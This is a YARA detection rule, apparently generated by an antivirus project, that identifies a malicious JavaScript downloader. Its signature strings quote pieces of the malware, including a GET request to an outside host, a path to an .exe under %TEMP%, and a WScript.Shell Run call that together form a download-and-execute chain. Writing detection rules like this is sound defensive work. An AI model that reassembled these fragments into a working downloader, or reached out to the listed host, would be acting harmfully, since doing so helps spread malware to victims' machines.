rule sig_20160329_813d81a46d23314b25d915e04e29851a {
  meta:
    description = "datamaliciousorder - file 20160329_813d81a46d23314b25d915e04e29851a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6ec984ee8cb64564d35b4da34d57d238ebbbf322f5ad8717f9971467fcf7024c"

  strings:
    $s1  = "function O() {return Xe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KqForacivWG.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[P](w() * 11); if (x1[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function J(NU, N1){tZ = tZ * 1; return NU - N1;};" fullword ascii
    $s4  = "x1[v](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s5  = "var Xe = function rG() {return WScript[m](\"WScript.Shell\");}(), ly = 11;" fullword ascii
    $s6  = "function C(){return \"\" + Sj;};" fullword ascii
    $s7  = "function vs(dh){Xe[\"Run\"](dh, tZ, tZ);};" fullword ascii
    $s8  = "function h() {return ((C1 == true) && (C1 == jR)) ? 1 : tZ;};" fullword ascii
    $s9  = "function XJ(q) {var Cy = (1, 2, 3, 4, 5, q); return Cy;};" fullword ascii
    $s10 = "return J(q0, N0);" fullword ascii
    $s11 = "var N = new this[\"Date\"]();" fullword ascii
    $s12 = "function x(){return m;};" fullword ascii
    $s13 = "function fi()" fullword ascii
    $s14 = "function w(){return 22;};" fullword ascii
    $s15 = " while (Xn){" fullword ascii
    $s16 = "C1 = true; " fullword ascii
    $s17 = "jR = true; " fullword ascii
    $s18 = "var h1 = false;" fullword ascii
    $s19 = "var C1 = false;" fullword ascii
    $s20 = "var jR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}